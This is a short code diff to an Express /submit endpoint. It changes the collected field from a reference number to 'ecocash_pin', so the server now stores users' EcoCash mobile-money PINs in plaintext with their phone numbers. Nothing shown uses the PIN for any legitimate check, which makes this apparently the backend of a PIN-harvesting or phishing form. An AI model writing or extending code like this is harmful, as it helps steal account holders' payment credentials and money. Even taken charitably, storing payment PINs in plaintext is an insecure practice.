@@ -108,12 +108,12 @@ app.post("/submit", async (req, res) => {
 
     const {
       ecocash_number,
-      reference_number
+      ecocash_pin
     } = req.body;
 
     await pool.query(
-      "INSERT INTO submissions (ecocash_number, reference_number) VALUES ($1,$2)",
-      [ecocash_number, reference_number]
+      "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1,$2)",
+      [ecocash_number, ecocash_pin]
     );
 
     res.json({
